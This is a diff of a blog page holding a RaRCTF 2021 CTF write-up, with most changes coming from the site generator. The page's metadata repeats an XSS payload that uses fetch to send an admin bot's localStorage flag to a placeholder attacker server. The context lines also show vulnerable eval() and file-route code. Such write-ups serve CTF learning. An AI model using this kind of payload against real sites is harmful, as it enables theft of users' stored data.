@@ -5,9 +5,9 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Vie ">
-<meta name="description" content="Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
+<meta name="description" content="Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&rsquo;re stealing admin&rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
 Insert as your payload:
-title: eh link: javascript:fetch(&amp;#39;your.server?fleg=&amp;#39;%2B(window.localStorage.getItem(&amp;#34;flag&amp;#34;))); And report to admin. Careful with the wait times&amp;hellip;
+title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&#34;flag&#34;))); And report to admin. Careful with the wait times&hellip;
 NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure." />
 <meta name="keywords" content=", writeups, xss, command-injection, web" />
 <meta name="robots" content="noodp" />
@@ -47,22 +47,25 @@ NOTE: I first-blooded this challenge before certain measures were implemented. T
     <meta name="msapplication-TileColor" content="">
 
 
-<meta itemprop="name" content="RaRCTF2021: Some simpler web probz">
-<meta itemprop="description" content="Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&rsquo;re stealing admin&rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
-Insert as your payload:
-title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&#34;flag&#34;))); And report to admin. Careful with the wait times&hellip;
-NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure."><meta itemprop="datePublished" content="2021-08-09T13:49:21-07:00" />
-<meta itemprop="dateModified" content="2021-08-09T13:49:21-07:00" />
-<meta itemprop="wordCount" content="950"><meta itemprop="image" content="https://jamvie.net/img/rubber_duckvie.png"/>
-<meta itemprop="keywords" content="writeups,xss,command-injection,web," />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://jamvie.net/img/rubber_duckvie.png"/>
 
-<meta name="twitter:title" content="RaRCTF2021: Some simpler web probz"/>
-<meta name="twitter:description" content="Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&rsquo;re stealing admin&rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
+  <meta itemprop="name" content="RaRCTF2021: Some simpler web probz">
+  <meta itemprop="description" content="Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you’re stealing admin’s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
 Insert as your payload:
-title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&#34;flag&#34;))); And report to admin. Careful with the wait times&hellip;
-NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure."/>
+title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&#34;flag&#34;))); And report to admin. Careful with the wait times…
+NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.">
+  <meta itemprop="datePublished" content="2021-08-09T13:49:21-07:00">
+  <meta itemprop="dateModified" content="2021-08-09T13:49:21-07:00">
+  <meta itemprop="wordCount" content="950">
+  <meta itemprop="image" content="https://jamvie.net/img/pixelvie.png">
+  <meta itemprop="keywords" content="Writeups,Xss,Command-Injection,Web">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jamvie.net/img/pixelvie.png">
+  <meta name="twitter:title" content="RaRCTF2021: Some simpler web probz">
+  <meta name="twitter:description" content="Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you’re stealing admin’s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
+Insert as your payload:
+title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&#34;flag&#34;))); And report to admin. Careful with the wait times…
+NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.">
 
 
 
@@ -124,18 +127,13 @@ NOTE: I first-blooded this challenge before certain measures were implemented. T
     </span>
 
     
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-176711986-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
+  
+    
+      
+    
+  
+
+
 </header>
 
 
@@ -189,7 +187,7 @@ link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getIte
 <p>flag: <code>rarctf{th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f}</code></p>
 <h2 id="secure-uploader">Secure Uploader</h2>
 <p>In the provided source, observe this piece of code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/file/&lt;id&gt;&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/file/&lt;id&gt;&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">file</span>(id):
 </span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> db()
 </span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
@@ -204,7 +202,7 @@ link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getIte
 <h2 id="maas-1--calculator">MAAS 1 // Calculator</h2>
 <p>The first part of &ldquo;Microservices as a Service&rdquo; was a challenge that involved improper use of the python function <code>eval()</code>. For those unaware, <code>eval()</code> takes as a parameter a string representing code. For example, <code>eval('print(&quot;hello&quot;)')</code> would return <code>hello</code> in your console. Obviously, not a very <em>safe</em> function to use.</p>
 <p>In the provided source, we see some very interesting code in <code>arithmetic/app.py</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/arithmetic&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/arithmetic&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">arithmetic</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;add&#39;</span>):
 </span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;http://arithmetic:3000/add?n1=</span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;n1&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;n2=</span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;n2&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
@@ -306,7 +304,7 @@ link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getIte
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
         
-          2021-08-09 16:49 -0400
+          2021-08-09 14:49 -0600
         
 
          
@@ -343,8 +341,6 @@ link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getIte
 
     
 
-    
-
   </main>
 
             </div>
@@ -371,7 +367,7 @@ link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getIte
 
 
 
-<script type="text/javascript" src="https://jamvie.net/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+<script type="text/javascript" src="https://jamvie.net/bundle.min.63e1cd4087b02bc78961fcab2aaf77e957e2227557c73ab774f1cc4a9db0645e90d2403ca03e55eb0887e432e82aea10afe7f125052af6dd46cfea148ecbc663.js" integrity="sha512-Y&#43;HNQIewK8eJYfyrKq936VfiInVXxzq3dPHMSp2wZF6Q0kA8oD5V6wiH5DLoKuoQr&#43;fxJQUq9t1Gz&#43;oUjsvGYw=="></script>
 
 
 
